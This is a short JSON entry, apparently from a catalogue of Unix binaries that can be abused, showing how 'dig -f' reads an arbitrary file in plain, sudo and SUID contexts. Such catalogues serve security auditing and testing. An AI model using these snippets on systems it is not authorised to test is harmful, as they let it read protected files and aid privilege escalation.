{
  "functions": {
    "file-read": [
      {
        "description": "",
        "code": "LFILE=file_to_read\ndig -f $LFILE\n"
      }
    ],
    "sudo": [
      {
        "description": "",
        "code": "LFILE=file_to_read\nsudo dig -f $LFILE\n"
      }
    ],
    "suid": [
      {
        "description": "",
        "code": "LFILE=file_to_read\n./dig -f $LFILE\n"
      }
    ]
  }
}
